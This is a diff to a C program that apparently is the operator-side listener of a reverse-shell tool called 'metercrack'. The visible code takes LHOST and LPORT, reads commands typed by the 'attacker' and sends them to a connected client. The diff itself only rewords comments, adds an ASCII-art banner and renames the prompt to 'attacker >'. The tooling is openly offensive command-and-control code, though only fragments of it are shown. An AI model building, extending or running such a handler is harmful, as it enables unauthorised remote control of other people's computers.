@@ -5,7 +5,7 @@
 
 #define MAX_COMMAND_LENGTH 1024
 
-// Initialize Winsock
+// Function to initialize Winsock
 void init_winsock() {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -14,9 +14,19 @@ void init_winsock() {
     }
 }
 
-// Clean up Winsock
+// Function to clean up Winsock
 void cleanup_winsock() {
     WSACleanup();
+}
+
+// Function to print the banner
+void print_banner() {
+    printf(" _                               _    \n");
+    printf(" _ __ ___   ___| |_ ___ _ __ ___ _ __ __ _  ___| | __\n");
+    printf("| '_ ` _ \\ / _ \\ __/ _ \\ '__/ __| '__/ _` |/ __| |/ /\n");
+    printf("| | | | | |  __/ ||  __/ | | (__| | | (_| | (__|   < \n");
+    printf("|_| |_| |_|\\___|\\__\\___|_|  \\___|_|  \\__,_|\\___|_\\_\\\n");
+    printf("\n");
 }
 
 // Function to handle communication with the connected client
@@ -26,7 +36,7 @@ void handle_client(SOCKET client_socket) {
 
     while (1) {
         // Print a prompt and get a command from the attacker
-        printf("metercrack > ");
+        printf("attacker > ");
         fgets(buffer, MAX_COMMAND_LENGTH, stdin);
 
         // Send the command to the client
@@ -53,6 +63,9 @@ int main() {
     int addr_size = sizeof(client_addr);
     char LHOST[16];
     int LPORT;
+
+    // Print the banner
+    print_banner();
 
     // Prompt the user to enter LHOST and LPORT
     printf("Enter LHOST (IP address to listen on): ");
